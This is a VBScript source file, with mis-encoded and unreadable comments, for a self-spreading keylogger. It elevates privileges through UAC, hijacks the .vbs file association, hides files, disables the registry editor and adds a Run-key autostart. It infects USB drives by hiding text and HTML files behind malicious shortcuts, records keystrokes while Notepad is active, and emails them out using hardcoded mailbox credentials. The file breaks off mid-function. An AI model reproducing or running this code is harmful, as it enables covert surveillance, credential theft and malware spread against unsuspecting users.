Option Explicit
On Error Resume Next

'+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
'+++++++++++++++++++++++++++++++++++++++��ʼ����������++++++++++++++++++++++++++++++++++++++++

'****************************************** �������� *****************************************

Const WINDOW_TITLE			= "�ޱ��� - ���±�"		'Ҫ���ӵĳ���Ĵ��ڱ�������
Const PROCESS_NAME			= "notepad.exe"			'Ҫ���ӵĳ���Ľ�������
Const DYN_WRAP_DLL	 		= "dynwrap.dll"			'dynamic wrapper���ļ���
Const SENDER_MAIL_ADDRESS	= "2637252534@qq.com"	'���ڷ����ʼ��������ַ
Const SENDER_MAIL_PASSWORD 	= "wzc123456"         	'���ڷ����ʼ�����������
Const SENDEE_MAIL_ADDRESS  	= "610955867@qq.com" 	'���ڽ����ʼ��������ַ

'*********************************** �Ƿ����ÿ�ݷ�ʽ�� ************************************

Dim g_isRunningWithLnk
g_isRunningWithLnk = False

'Call CheckOpenWithLnk()

Sub CheckOpenWithLnk()
	Dim args
	Set args = WScript.Arguments
	If args.Count = 2 Then 'U�̸�Ⱦ��Ŀ�ݷ�ʽĬ��Ϊ�������� ��һ������Ϊԭ�ļ�·�� ��һ������Ϊshortcut
		shortcutCheck = args(1)
		If shortcutCheck <> "shortcut" Then Exit Sub
		g_isRunningWithLnk = True
		originFilePath = args(0)
		Call OpenFile(originFilePath)
		Call ReopenVbsHorse()
	End If
End Sub

'************************************* �����ű�����Ȩ�� **************************************

Dim g_isRunningWithoutUAC '�Ƿ�������Ȩ��
g_isRunningWithoutUAC = False

Call DoUACRunScript()

Sub DoUACRunScript()
	If g_isRunningWithLnk Then 
		g_isRunningWithoutUAC = True
		Exit Sub
	End If
	Dim objOS
	For Each objOS in GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem") 
		If InStr(objOS.Caption, "XP") = 0 Then 
			If WScript.Arguments.Count = 0 Then
				Dim objShell
				Set objShell = CreateObject("Shell.Application")
				objShell.ShellExecute "WScript.exe", Chr(34) &_
				WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
				Set objShell = Nothing
				g_isRunningWithoutUAC = True
			End If
		End If
	Next
End Sub

'************************************* ǿ�Ƴ�����32λ���� ************************************

Const DEFAULT_VBS_OPEN_COMMAND_KEY	= "HKLM\SOFTWARE\Classes\vbsfile\shell\open\command\"
Const CUSTOM_VBS_OPEN_COMMAND_VALUE = """%SystemRoot%\SysWOW64\WScript.exe"" ""%1"" %*"

Dim g_isRunningOnX86
g_isRunningOnX86 = False

Call OpenWithX86()

Sub OpenWithX86() '��������ǿ�Ƴ�����32λWScript.exe����ִ��
	If g_isRunningWithoutUAC = True Then Exit Sub
	If X86orX64() = "X64" Then
		If ReadReg(DEFAULT_VBS_OPEN_COMMAND_KEY) <> CUSTOM_VBS_OPEN_COMMAND_VALUE Then
			Call SetVbsFileAss()	'�ı�vbs��ʽ�ļ�����
			Call ReopenVbsHorse()	'��������ľ��
			Exit Sub
		End If
	End If	
	g_isRunningOnX86 = True
End Sub

Sub ReopenVbsHorse()
	Call OpenFile(WScript.ScriptFullName)
End Sub

Sub SetVbsFileAss() '�ı�vbs��ʽ�ļ�����
	Call WriteReg(DEFAULT_VBS_OPEN_COMMAND_KEY, CUSTOM_VBS_OPEN_COMMAND_VALUE, "REG_EXPAND_SZ")
End Sub

Function X86orX64() '�ж���X86�ܹ�����X64�ܹ�
	Dim objFileSystem, systemRootPath
	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
	X86orX64 = "X86"
	systemRootPath = objFileSystem.GetSpecialFolder(0) & "\" 
	If objFileSystem.FolderExists(systemRootPath & "SysWow64") Then
		X86orX64 = "X64"
	End if
End Function

'******************************* ע��Dynamic Wrapper DLL ********************************

Call RegisterDynamicWrapperDLL()	'ע��Dynamic Wrapper DLL

Sub RegisterDynamicWrapperDLL()		'ע��Dynamic Wrapper DLL
	If g_isRunningOnX86 = False Then Exit Sub
	Dim strDllPath
	strDllPath = Replace(WScript.ScriptFullName, WScript.ScriptName, DYN_WRAP_DLL)	'��ȡDLL�ļ��ľ���·��
	Call RegisterCOM(strDllPath)	'ע��DynamicWrapper���
End Sub

Sub RegisterCOM(strSource)			'ע�����
	Dim objFileSystem, objWshShell, strSystem32Dir
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Set objWshShell = WScript.CreateObject("WScript.Shell")
	strSystem32Dir = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\System32\"
	If X86orX64 = "X64" Then
		strSystem32Dir = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\SysWOW64\"
	End If
	
	If objFileSystem.FileExists(strSystem32Dir & DYN_WRAP_DLL) Then Exit Sub
	objFileSystem.CopyFile strSource, strSystem32Dir, False
	WScript.Sleep 1000
	
	Dim blnComplete
	blnComplete = False
	Do
		If objFileSystem.FileExists(strSystem32Dir & DYN_WRAP_DLL) Then
			Dim regSvrPath
			regSvrPath = strSystem32Dir & "regsvr32.exe /s "
			objWshShell.Run regSvrPath & strSystem32Dir & DYN_WRAP_DLL
			blnComplete = True
		End If
	Loop Until blnComplete
	WScript.Sleep 2000 '�ӳ�2���ע��COMԤ��ʱ��
	Set objFileSystem = Nothing
	Set objWshShell = Nothing	
End Sub

'******************************** ע��Ҫʹ�õ�Win32API���� ********************************

Dim g_objConnectAPI

Call ConfigureWin32API()

Sub ConfigureWin32API
	If g_isRunningOnX86 = False Then Exit Sub
	Set g_objConnectAPI = WScript.CreateObject("DynamicWrapper") '����ȫ�ֵ�DynamicWrapper�������ʵ��
	With g_objConnectAPI '����Ϊ������Ҫ�õ���Win32API����
		.Register "user32.dll", "FindWindow", "i=ss", "f=s", "r=l"
		.Register "user32.dll", "GetForegroundWindow", "f=s", "r=l"
		.Register "user32.dll", "GetAsyncKeyState", "i=l", "f=s", "r=l"
	End With
End Sub

'*************************************** ���������ļ� **************************************

Call HideAllFile()

Sub HideAllFile() '���������ļ����ƻ�Explorer����ѡ����ؿ�ݷ�ʽС��ͷ������ע�����
	Const NoHiddenRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue" 	
	Const ShowAllRegPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"		
	Const ShowShortCurIconRegPath = "HKCR\lnkfile\IsShortcut"
	Const RegToolForbidRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"
	Const HideFileRegRootPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\"
	Call WriteReg(HideFileRegRootPath & "Hidden", 2, "REG_DWORD") 			'��ͨ�ļ� 			1-��ʾ 2-����
	Call WriteReg(HideFileRegRootPath & "ShowSuperHidden", 0, "REG_DWORD") 	'��ϵͳ�������ļ� 	1-��ʾ 0-����
	Call WriteReg(HideFileRegRootPath & "HideFileExt", 1, "REG_DWORD") 		'�ļ���չ��			0-��ʾ 1-����
	Call WriteReg(NoHiddenRegPath, 3, "REG_DWORD") 							'�ƻ�����ѡ��
	Call WriteReg(ShowAllRegPath, 2, "REG_DWORD")							'�ƻ�����ѡ��
	Call WriteReg(RegToolForbidRegPath, 1, "REG_DWORD")						'����ע�����
	Call DeleteReg(ShowShortCurIconRegPath) 								'���ؿ�ݷ�ʽС��ͷ
	
	'Call RestartExplorer() '���ôκ�������ǿ������Explorer��ǿ�������ļ��Ϳ����ʽС��ͷ�����ǻ������û���ע�⣬��ȡ��
End Sub

'************************************* ��������WinDir ************************************

Call Propagate(GetPropagateTragetFolder)

Sub Propagate(targetPath) '��������ָ���ļ���
	If g_isRunningOnX86 = False Then Exit Sub
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	
	Dim sourcePath, sourceName
	sourcePath = objFileSystem.GetFile(WScript.ScriptFullName)
	sourceName = objFileSystem.GetFile(WScript.ScriptFullName).Name
	If objFileSystem.FileExists(targetPath & sourceName) = False Then
		objFileSystem.CopyFile sourcePath, targetPath, False
		Call HideFile(targetPath & sourceName)
		WScript.Sleep 1000
	End If
	
	Dim dllPath
	dllPath = Replace(sourcePath, sourceName, DYN_WRAP_DLL)
	If objFileSystem.FileExists(targetPath & DYN_WRAP_DLL) = False And objFileSystem.FileExists(dllPath)  Then
		objFileSystem.CopyFile dllPath, targetPath, False
		Call HideFile(targetPath & DYN_WRAP_DLL)
		WScript.Sleep 3000
	End If
	Set objFileSystem = Nothing
End Sub

Function GetPropagateTragetFolder() '���ط�ֳ��Ŀ¼
	Dim objWshShell
	Set objWshShell = CreateObject("WScript.Shell")
	getPropagateTragetFolder = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\"
	Set objWshShell = Nothing
End Function

Function GetSelfName()
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	GetSelfName = objFileSystem.GetFile(WScript.ScriptFullName).Name
	Set objFileSystem = Nothing
End Function

'*************************************** �����Զ����� ***************************************

Call ConfigureAutoRun()

Sub ConfigureAutoRun()
	If g_isRunningOnX86 = False Then Exit Sub
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
	Const REG_PATH = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"	'����������ע����ַ
	Const KEY_NAME = "VbsHouse"												'��Ҫ���������ĳ����ע�������
	Dim horsePath
	horsePath = GetPropagateTragetFolder & GetSelfName						'��Ҫ���������ĳ���ľ���·��
	Call WriteReg(REG_PATH & KEY_NAME, horsePath, "") 						'�޸�ע���������
	Set objFileSystem = Nothing
End Sub

'************************************ ע��������ȫ�ֱ��� ************************************

Dim g_theKeyResult '���ڱ�����̼�¼�Ľ��
g_theKeyResult = ""

'**************************************** ִ����ѭ�� ****************************************

Call Main()

Sub Main()
	If g_isRunningOnX86 = False Then Exit Sub
	Dim loopCount
	loopCount = 0
	Do 'ѭ������ָ�����ں�U��
		If IsFoundWindowTitle() And IsTheWindowActive() Then Exit Do '��ָ�����ڴ�����Ϊ��ǰ���������ѭ��
		WScript.Sleep 500
		
		loopCount = loopCount - 1
		If(loopCount < 0) Then
			loopCount = 10
			Call SniffUDisk()
		End If
	Loop
	Call RecordKeyBoard()
	'Call(SendEmail SENDER_MAIL_ADDR,SENDER_MAIL_PWD,SENDEE_MAIL_ADDR, "", "��������", TheKeyResult, "") '���Ͱ�����Ϣ���ʼ�
	Call Main()
End Sub

'****************************************** ��ȾU�� *****************************************

Sub SniffUDisk()
	Dim objFileSystem, SubDrives
	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
	Set SubDrives = objFileSystem.Drives
	Dim drive
	For Each drive In SubDrives
		Dim drivePath
		drivePath = drive.DriveLetter
		If drive.DriveType = 1 And drive.IsReady Then
			Call InFectDrive(drivePath & ":\")
		End If
	Next
	Set objFileSystem = Nothing
	Set SubDrives = Nothing
End Sub

Sub InFectDrive(drivePath)
	If HasInfected(drivePath) = False Then
		Call Propagate(drivePath)
	End If
	Call LnkInfectDrive(drivePath)
End Sub

Function HasInfected(drivePath) '�ж��Ƿ��Ѿ���Ⱦ��ָ���̷�
	Dim objFileSystem
	Set objFileSystem = CreateObject("Scripting.FileSystemObject")
	Dim horseName, horsePath
	horseName = objFileSystem.GetFile(Wscript.ScriptFullName).Name
	horsePath = drivePath & horseName
	
	HasInfected = False
	If objFileSystem.FileExists(horsePath) Then
		HasInfected = True
	End If
	Set objFileSystem = Nothing
End Function

'************************************** �ÿ�ݷ�ʽ��Ⱦ **************************************

Sub LnkInfectDrive(drivePath) 'Ϊ���̸�Ŀ¼�����е�txt, log, html�ļ�����ָ��VbsHorse�Ŀ�ݷ�ʽ��������ԭ�ļ�
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Dim folder, files
	Set folder = objFileSystem.GetFolder(drivePath)
	Set files = folder.Files
	Dim file
	For Each file In files
		Dim fileSuffix
		fileSuffix = GetFileSuffix(file.Name)
		If fileSuffix <> "lnk" And file.Name <> GetSelfName Then '�Ƿ��ǿ�ݷ�ʽ�ļ������ļ������ǲ�����
			Dim lnkPath
			lnkPath = drivePath & file.Name & ".lnk"
			If objFileSystem.FileExists(lnkPath) = False Then '����������ļ�
				Dim targetPath, args
				targetPath = drivePath & GetSelfName
				args = Chr(34) & file.Name & Chr(34) & " shortcut"
				Call CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, file.Path) '������Ӧ�Ŀ�ݷ�ʽ������ԭ�ļ�
			End If
		End If
	Next
	Set objFileSystem = Nothing
End Sub

Function GetFileSuffix(fileName)
	Dim splitFileNameArray
	splitFileNameArray = Split(fileName, ".")
	GetFileSuffix = splitFileNameArray(UBound(splitFileNameArray))
	Set splitFileNameArray = Nothing
End Function

Sub CreateShortcutAndHideOriginFile(lnkPath, targetPath, args, originFilePath) '������Ӧ�Ŀ�ݷ�ʽ������ԭ�ļ�
	Dim originFileSuffix, iconPath
	originFileSuffix = GetFileSuffix(originFilePath)
	Select Case originFileSuffix '����Ƿ���txt, log, html, htm, mht���͵��ļ�
	Case "txt", "log" '�ı�
		iconPath = "%SystemRoot%\System32\imageres.dll, 97"
	Case "html", "htm", "mht" '��ҳ
		iconPath = "%SystemRoot%\System32\imageres.dll, 2"
	Case Else
		Exit Sub
	End Select
	
	Call HideFile(originFilePath) '����ԭ�ļ�
	
	Dim objShell, shortcut
	Set objShell = CreateObject("WScript.Shell")
	Set shortcut = objShell.CreateShortcut(lnkPath)
	With Shortcut
		.TargetPath = targetPath
		.Arguments = args
		.WindowStyle = 4
		.IconLocation = iconPath
		.Save
	End With
	Set objShell = Nothing
	Set shortcut = Nothing
End Sub

'*************************************** ��¼���̲��� ***************************************

Sub RecordKeyboard()
	Do '��ʼѭ����¼�����������ڳ��ڷǼ���״̬������û�����س�����ֹͣ��¼����
		If Not IsTheWindowActive() Then Exit Sub
		Dim TheKey
		theKey = ""
		theKey = GetThePressKey()
		g_theKeyResult = g_theKeyResult & theKey
		WScript.Sleep 5
	Loop Until theKey = "[ENTER]"
	If SendEmail(SENDER_MAIL_ADDRESS, SENDER_MAIL_PASSWORD, SENDEE_MAIL_ADDRESS, "", "����VbsHouse���ʼ�", "��л������VbsHouse�����յ��ļ��̼�¼��ϢΪ:" & g_theKeyResult, "") Then
		WScript.Echo "�����ʼ��ɹ�������:" & g_theKeyResult
	Else
		WScript.Echo "�����ʼ�ʧ�ܡ�����:" & g_theKeyResult
End If
	g_theKeyResult = ""  '��ռ��̼�¼
End Sub

Function IsFoundWindowTitle() '���WINDOW_TITLE��ָ���������ֵĴ����Ƿ����
	Dim hWnd
	hWnd = g_objConnectAPI.FindWindow(vbNullString,WINDOW_TITLE)
	IsFoundWindowTitle = CBool(hWnd)
End Function

Function IsTheWindowActive() '���WINDOW_TITLE��ָ���������ֵĴ����Ƿ�Ϊ��ǰ����Ĵ���

	Dim hWnd,hAct
	hWnd = g_objConnectAPI.FindWindow(vbNullString,WINDOW_TITLE)
	hAct = g_objConnectAPI.GetForegroundWindow()
	IsTheWindowActive = CBool(hWnd=hAct)
	
End Function

Function GetThePressKey() '��ȡ�����ϱ����µļ�
	With g_objConnectAPI
	    If .GetAsyncKeyState(13) = -32767 Then
		    GetThePressKey = "[ENTER]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(17) = -32767 Then
		    GetThePressKey = "[CTRL]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(8) = -32767 Then
		    GetThePressKey = "[BACKSPACE]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(9) = -32767 Then
		    GetThePressKey = "[TAB]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(18) = -32767 Then
		    GetThePressKey = "[ALT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(19) = -32767 Then
		    GetThePressKey = "[PAUSE]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(20) = -32767 Then
		    GetThePressKey = "[CAPS LOCK]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(27) = -32767 Then
		    GetThePressKey = "[ESC]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(33) = -32767 Then
		    GetThePressKey = "[PAGE UP]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(34) = -32767 Then
		    GetThePressKey = "[PAGE DOWN]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(35) = -32767 Then
		    GetThePressKey = "[END]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(36) = -32767 Then
		    GetThePressKey = "[HOME]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(44) = -32767 Then
		    GetThePressKey = "[SYSRQ]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(45) = -32767 Then
		    GetThePressKey = "[INS]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(46) = -32767 Then
		    GetThePressKey = "[DEL]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(144) = -32767 Then
		    GetThePressKey = "[NUM LOCK]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(145) = -32767 Then
		    GetThePressKey = "[SCROLL LOCK]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(37) = -32767 Then
		    GetThePressKey = "[LEFT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(38) = -32767 Then
		    GetThePressKey = "[UP]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(39) = -32767 Then
		    GetThePressKey = "[RIGHT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(40) = -32767 Then
		    GetThePressKey = "[DOWN]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(112) = -32767 Then
		    GetThePressKey = "[F1]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(113) = -32767 Then
		    GetThePressKey = "[F2]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(114) = -32767 Then
		    GetThePressKey = "[F3]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(115) = -32767 Then
		    GetThePressKey = "[F4]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(116) = -32767 Then
		    GetThePressKey = "[F5]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(117) = -32767 Then
		    GetThePressKey = "[F6]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(118) = -32767 Then
		    GetThePressKey = "[F7]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(119) = -32767 Then
		    GetThePressKey = "[F8]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(120) = -32767 Then
		    GetThePressKey = "[F9]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(121) = -32767 Then
		    GetThePressKey = "[F10]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(122) = -32767 Then
		    GetThePressKey = "[F11]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(123) = -32767 Then
		    GetThePressKey = "[F12]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(124) = -32767 Then
		    GetThePressKey = "[F13]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(125) = -32767 Then
		    GetThePressKey = "[F14]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(126) = -32767 Then
		    GetThePressKey = "[F15]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(127) = -32767 Then
		    GetThePressKey = "[F16]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(32) = -32767 Then
		    GetThePressKey = "[�ո�]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(186) = -32767 Then
		    GetThePressKey = ";"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(187) = -32767 Then
		    GetThePressKey = "="
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(188) = -32767 Then
		    GetThePressKey = ","
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(189) = -32767 Then
		    GetThePressKey = "-"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(190) = -32767 Then
		    GetThePressKey = "."
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(191) = -32767 Then
		    GetThePressKey = "/"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(192) = -32767 Then
		    GetThePressKey = "`"
		    Exit Function
	    End If
	  
	    '----------NUM PAD----------
	    If .GetAsyncKeyState(96) = -32767 Then
		    GetThePressKey = "0"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(97) = -32767 Then
		    GetThePressKey = "1"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(98) = -32767 Then
		    GetThePressKey = "2"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(99) = -32767 Then
		    GetThePressKey = "3"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(100) = -32767 Then
		    GetThePressKey = "4"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(101) = -32767 Then
		    GetThePressKey = "5"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(102) = -32767 Then
		    GetThePressKey = "6"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(103) = -32767 Then
		    GetThePressKey = "7"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(104) = -32767 Then
	    	GetThePressKey = "8"
	    	Exit Function
	    End If
	  
	    If .GetAsyncKeyState(105) = -32767 Then
		    GetThePressKey = "9"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(106) = -32767 Then
		    GetThePressKey = "*"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(107) = -32767 Then
		    GetThePressKey = "+"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(108) = -32767 Then
		    GetThePressKey = "[ENTER]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(109) = -32767 Then
		    GetThePressKey = "-"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(110) = -32767 Then
		    GetThePressKey = "."
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(&H1) = -32767 Then
		    GetThePressKey = "[������]"
		    Exit Function
	    End If
		
	    If .GetAsyncKeyState(&H4) = -32767 Then
		    GetThePressKey = "[����м�]"
		    Exit Function
	    End If		
		
	    If .GetAsyncKeyState(&H2) = -32767 Then
		    GetThePressKey = "[����Ҽ�]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(220) = -32767 Then
		    GetThePressKey = "\"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(222) = -32767 Then
		    GetThePressKey = "'"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(221) = -32767 Then
		    GetThePressKey = "[�ҷ�����]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(219) = -32767 Then
		    GetThePressKey = "[������]"
		    Exit Function
	    End If
	  	
	    If .GetAsyncKeyState(16) = -32767 Then
		    GetThePressKey = "[SHIFT]"
		    Exit Function
	    End If
	  		  	
	    If .GetAsyncKeyState(65) = -32767 Then
		    GetThePressKey = "A"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(66) = -32767 Then
		    GetThePressKey = "B"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(67) = -32767 Then
		    GetThePressKey = "C"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(68) = -32767 Then
		    GetThePressKey = "D"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(69) = -32767 Then
		    GetThePressKey = "E"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(70) = -32767 Then
		    GetThePressKey = "F"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(71) = -32767 Then
		    GetThePressKey = "G"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(72) = -32767 Then
		    GetThePressKey = "H"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(73) = -32767 Then
		    GetThePressKey = "I"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(74) = -32767 Then
		    GetThePressKey = "J"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(75) = -32767 Then
		    GetThePressKey = "K"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(76) = -32767 Then
		    GetThePressKey = "L"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(77) = -32767 Then
		    GetThePressKey = "M"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(78) = -32767 Then
		    GetThePressKey = "N"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(79) = -32767 Then
		    GetThePressKey = "O"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(80) = -32767 Then
		    GetThePressKey = "P"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(81) = -32767 Then
		    GetThePressKey = "Q"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(82) = -32767 Then
		    GetThePressKey = "R"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(83) = -32767 Then
		    GetThePressKey = "S"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(84) = -32767 Then
		    GetThePressKey = "T"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(85) = -32767 Then
		    GetThePressKey = "U"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(86) = -32767 Then
		    GetThePressKey = "V"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(87) = -32767 Then
		    GetThePressKey = "W"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(88) = -32767 Then
		    GetThePressKey = "X"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(89) = -32767 Then
		    GetThePressKey = "Y"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(90) = -32767 Then
		    GetThePressKey = "Z"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(48) = -32767 Then
		    GetThePressKey = "[0]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(49) = -32767 Then
		    GetThePressKey = "[1]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(50) = -32767 Then
		    GetThePressKey = "[2]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(51) = -32767 Then
		    GetThePressKey = "[3]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(52) = -32767 Then
		    GetThePressKey = "[4]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(53) = -32767 Then
		    GetThePressKey = "[5]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(54) = -32767 Then
		    GetThePressKey = "[6]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(55) = -32767 Then
		    GetThePressKey = "[7]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(56) = -32767 Then
		    GetThePressKey = "[8]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(57) = -32767 Then
		    GetThePressKey = "[9]"
		    Exit Function
	    End If
	End With
End Function

'**************************************** �����ʼ� ****************************************

Function SendEmail(senderAddress, senderPassword, sendeeAddress, backupAddress, mailTitle, mailContent, mailAttachment)
	On Error Resume Next
	Const MS_Space = "http://schemas.microsoft.com/cdo/configuration/" '���ÿռ�
	
    Dim objEmail
    Set objEmail = CreateObject("CDO.Message")
    Dim strSenderID
    strSenderID = Split(senderAddress, "@", -1, vbTextCompare)
    
    objEmail.From = senderAddress		'�ļ��˵�ַ
    objEmail.To = sendeeAddress			'�ռ��˵�ַ
    If backupAddress <> "" Then
		objEmail.CC = backupAddress		'���õ�ַ
    End If
    objEmail.Subject = mailTitle   		'�ʼ�����
    objEmail.TextBody = mailContent 	'�ʼ�����
    If MailAttachment <> "" Then
		objEmail.AddAttachment mailAttachment	'������ַ
    End If
    
    With objEmail.Configuration.Fields
		.Item(MS_Space & "sendusing") = 2                        	'���Ŷ˿�
        .Item(MS_Space & "smtpserver") = "smtp." & strSenderID(1)   '���ŷ�����
        .Item(MS_Space & "smtpserverport") = 25                     'SMTP�������˿�
        .Item(MS_Space & "smtpauthenticate") = 1                    'CDObasec
        .Item(MS_Space & "sendusername") = strSenderID(0)           '�ļ��������˻���
        .Item(MS_Space & "sendpassword") = senderPassword           '�ʻ�������    
        .Update
    End With
    
	Err.Clear
    objEmail.Send '�����ʼ�
	
    Set objEmail = Nothing
    SendEmail = True
    
    If Err Then
		'WSCript.Echo Err.Description
        Err.Clear
        SendEmail = False
    End If
End Function

'**************************************** ���ߺ��� ****************************************

Sub WriteReg(key, value, typeName) 'дע���
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	If typeName = "" Then
		objShell.RegWrite key, value
	Else
		objShell.RegWrite key, value, typeName
	End If
	Set objShell = Nothing
End Sub

Function ReadReg(key) '��ȡע�������key����������·��
	On Error Resume Next
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	ReadReg = objShell.RegRead(key)
	Set objShell = Nothing
End Function

Sub DeleteReg(targetPath) 'ɾ��ע���
	On Error Resume Next
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.RegDelete targetPath
	Set objShell = Nothing
End Sub

Sub OpenFile(filePath)
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	objShell.Run("explorer.exe " & filePath) '��ʹ��CMD�򿪣���ֹ�����ڿ��û�����
	Set objShell = Nothing
End Sub

Sub HideFile(filePath)
	Dim objFileSystem, objFile
	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
	Set objFile = objFileSystem.GetFile(filePath)
	objFile.Attributes = 2 '0-��ͨ 1-ֻ�� 2-���� 4-ϵͳ
